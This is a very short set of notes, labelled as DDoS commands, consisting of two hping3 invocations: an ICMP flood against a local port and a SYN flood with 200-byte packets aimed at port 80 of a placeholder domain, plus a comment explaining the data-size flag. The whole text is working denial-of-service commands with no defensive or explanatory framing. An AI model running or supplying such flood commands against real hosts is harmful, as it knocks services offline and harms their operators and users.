<!-- DDOS SHII -->
sudo hping3 -1 --flood 127.0.0.1:8000

<!-- worst -->
sudo hping3 -d 200 -p 80 -S --flood domain
<!-- -d is data size to send -->

